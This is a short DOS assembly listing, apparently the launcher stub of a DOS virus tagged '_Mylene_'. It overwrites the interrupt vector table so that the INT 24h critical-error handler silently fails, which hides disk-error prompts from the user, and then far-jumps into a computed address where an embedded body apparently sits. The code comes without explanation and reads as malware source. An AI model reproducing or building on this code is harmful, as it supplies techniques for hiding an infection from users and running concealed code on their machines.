.model tiny
.code
org 100h
start:
    .386
    push ds
    xor ax, ax
    mov ds, ax
    mov 4 ptr ds:[198h], 00CF03B0h
    mov 4 ptr ds:[090h], 00000198h
    pop ds
    mov eax, 4 ptr ds:[11Ch] 
    mov si, ax
    and si, 0Fh
    shr eax, 4
    mov dx, ds
    add ax, dx
    add si, 42h
    push ax
    push si
    retf
    db '_Mylene_'  
end start